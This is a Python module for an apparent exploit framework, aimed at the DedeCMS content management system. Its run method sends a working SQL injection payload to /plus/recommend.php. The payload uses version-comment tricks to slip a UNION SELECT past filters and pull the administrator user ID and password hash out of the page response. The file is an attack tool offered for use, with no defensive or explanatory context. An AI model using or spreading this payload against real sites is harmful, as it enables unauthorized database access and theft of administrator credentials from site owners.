#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit import exploits
from zerooosploit import color
import prettytable as pt
import requests
import re


class Exploit(exploits.ExploitAggregate):

    option = {
        'url': {'default': ''}
    }

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'name': 'dedecms_injection',
            'product': 'dedecms',
            'authors': '',
            'references': '',
            'cve': '',
            'create_date': '2019-05-30'
        }

    def register_option(self, key, value):
        if key in self.option.keys():
            self.option[key]['default'] = value

    def get_options(self, key):
        return self.option[key]['default']

    def show_options(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.option.items():
            field_names.append(v)
            for x in k.values():
                add_row.append(x)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def show_info(self):
        tb = pt.PrettyTable()
        field_names = []
        add_row = []
        for v, k in self.info.items():
            field_names.append(v)
            add_row.append(k)
        tb.field_names = field_names
        tb.add_row(add_row)
        print(tb)

    def run(self):
        url = self.get_options('url')
        payload = '/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294'

        try:
            r = requests.get(url=url + payload, timeout=60)
            req = re.findall('<h2>(.*?)</h2>', r.text, re.S)
            if req:
                print(color.success_tips(url, req))
            else:
                print(color.fail_tips(url, ''))
        except BaseException:
            pass


def main():
    exploit = Exploit()
    exploit.run()
